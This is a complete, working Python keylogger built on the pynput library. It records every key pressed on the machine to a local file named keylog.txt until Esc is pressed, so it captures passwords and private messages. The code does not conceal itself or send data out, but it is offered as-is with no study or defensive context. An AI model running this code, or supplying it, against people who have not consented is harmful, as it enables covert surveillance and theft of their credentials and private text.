from pynput import keyboard

# The log file where keystrokes will be stored
log_file = "keylog.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file, "a") as f:
        f.write(f"{key}\n")

# Function to handle key presses
def on_press(key):
    try:
        # Log alphanumeric keys
        write_to_file(key.char)
    except AttributeError:
        # Log special keys
        write_to_file(key)

# Function to handle key releases
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Setting up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
